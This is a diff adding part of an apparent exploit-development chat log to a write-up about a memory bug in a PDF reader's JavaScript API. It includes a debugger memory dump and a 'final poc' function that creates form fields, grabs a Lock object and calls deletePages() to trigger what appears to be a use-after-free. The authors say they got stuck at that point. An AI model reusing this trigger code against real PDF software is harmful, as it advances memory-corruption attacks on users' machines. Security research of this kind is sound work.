@@ -816,3 +816,51 @@ see ray of light shining
 
 reuben:
 not fully cos the text is UTF-16LE, but i might be able to do something let's see
+
+reuben:
+![image-2](https://github.com/user-attachments/assets/a14232ca-3ad0-457f-995a-62cbd596c7bb)
+
+reuben:
+this is another one, which means i can probably bypass the utf-16le restriction
+
+0:000> db ecx - 4
+0f55f9ec  78 31 32 78 33 34 78 35-36 78 37 38 78 39 41 78  x12x34x56x78x9Ax
+0f55f9fc  42 43 78 44 45 78 46 30-78 31 32 48 00 00 00 00  BCxDExF0x12H....
+0f55fa0c  00 00 00 00 06 00 01 0f-40 da 3a 0e 00 00 00 00  ........@.:.....
+0f55fa1c  00 00 00 00 00 00 00 00-e0 49 55 0f 10 00 00 00  .........IU.....
+0f55fa2c  02 00 00 00 6c bb 54 0f-48 bb 54 0f 0a 00 00 00  ....l.T.H.T.....
+0f55fa3c  00 00 00 00 01 00 00 00-10 00 00 00 10 00 00 00  ................
+0f55fa4c  54 00 69 00 6d 00 65 00-73 00 20 00 42 00 6f 00  T.i.m.e.s. .B.o.
+0f55fa5c  6c 00 64 00 49 00 74 00-61 00 6c 00 69 00 63 00  l.d.I.t.a.l.i.c.
+
+......... convo omitted for sake of braviety and mental health
+
+till at one point we got to the "final poc" where we got stuck which looks like this 
+function type_conf(){
+    app.alert("Starting enhanced memory leak exploit");
+    
+    // Step 2: Create form fields
+    gFields.signature = app.activeDocs[0].addField(
+      "signature_field",
+      "signature",
+      0,
+      [10, 10, 100, 50]
+    );
+    
+    gFields.combo = app.activeDocs[0].addField(
+      "HAHAHAHAHAH",
+      "combobox",
+      0,
+      [10, 60, 100, 100]
+    );
+    
+    // Step 4: Get the critical Lock object
+    gLockObj = gFields.signature.getLock();
+    app.alert("Got Lock object from signature field");
+    
+    app.alert("Triggering vulnerability with deletePages()");
+    app.activeDocs[0].deletePages();
+    app.alert("Vulnerability triggered");
+    
+    gLockObj.__defineGetter__('fields', function () {}); 
+}
